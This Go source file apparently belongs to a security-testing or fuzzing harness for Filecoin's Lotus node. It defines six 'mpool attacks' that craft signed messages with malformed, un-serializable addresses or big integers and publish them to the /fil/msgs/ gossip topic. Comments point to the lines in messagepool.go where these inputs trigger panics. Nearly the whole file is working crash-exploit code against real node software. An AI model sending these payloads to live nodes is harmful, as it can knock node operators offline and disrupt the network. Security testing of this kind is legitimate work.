package main

import (
	"log"
)

func getAllMpoolAttacks() []namedAttack {
	return []namedAttack{
		{name: "msgs/lotus-signed-message-with-bad-address-secp256k1-sig", fn: mpoolSigCacheBombAddr},
		{name: "msgs/lotus-signed-message-with-bad-address-bls-sig", fn: mpoolSigCacheBombBLS},
		{name: "msgs/lotus-signed-message-with-unserializable-address", fn: mpoolChainLengthBombAddr},
		{name: "msgs/lotus-signed-message-with-unserializable-bigint", fn: mpoolChainLengthBombBigInt},
		{name: "msgs/lotus-valid-then-bad-signed-message-sequence", fn: mpoolMixedValidThenBomb},
		{name: "msgs/lotus-signed-message-with-bad-address-delegated-sig", fn: mpoolDelegatedSigBomb},
	}
}

// sigCacheKey with secp256k1 sig type calls m.Cid() at messagepool.go:808
func mpoolSigCacheBombAddr() {
	addr := generateRoundTripBombAddress()
	msg := buildMessageCBOR(addr)
	sig := append([]byte{0x01}, randomBytes(65)...) // secp256k1
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[mpool] sigcache-bomb-addr: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

// sigCacheKey with BLS sig type calls m.Cid() at messagepool.go:805
func mpoolSigCacheBombBLS() {
	addr := generateRoundTripBombAddress()
	msg := buildMessageCBOR(addr)
	sig := append([]byte{0x02}, randomBytes(96)...) // BLS type + 96-byte sig
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[mpool] sigcache-bomb-bls: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

// verifyMsgBeforeAdd calls m.ChainLength() which panics on serialize error
func mpoolChainLengthBombAddr() {
	addr := generateRoundTripBombAddress()
	msg := buildMessageCBOR(addr)
	sig := append([]byte{0x01}, randomBytes(65)...)
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[mpool] chainlength-bomb-addr: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

func mpoolChainLengthBombBigInt() {
	bombVal := generateRoundTripBombBigInt()
	msg := buildMessageCBORWithBigInt(bombVal)
	sig := append([]byte{0x01}, randomBytes(65)...)
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[mpool] chainlength-bomb-bigint: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

// Send a valid message then a bomb message in quick succession
func mpoolMixedValidThenBomb() {
	validAddr := []byte{0x00, 0xe8, 0x07}
	validMsg := buildMessageCBOR(validAddr)
	validSig := append([]byte{0x01}, randomBytes(65)...)
	validData := buildSignedMessageCBOR(validMsg, validSig)
	publishMsg(validData)

	bombAddr := generateRoundTripBombAddress()
	bombMsg := buildMessageCBOR(bombAddr)
	bombSig := append([]byte{0x01}, randomBytes(65)...)
	bombData := buildSignedMessageCBOR(bombMsg, bombSig)
	log.Printf("[mpool] mixed-valid-then-bomb: valid=%d bomb=%d bytes", len(validData), len(bombData))
	publishMsg(bombData)
}

// sigCacheKey with SigTypeDelegated
func mpoolDelegatedSigBomb() {
	addr := generateRoundTripBombAddress()
	msg := buildMessageCBOR(addr)
	sig := append([]byte{0x03}, randomBytes(65)...) // delegated sig type
	data := buildSignedMessageCBOR(msg, sig)
	log.Printf("[mpool] delegated-sig-bomb: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}
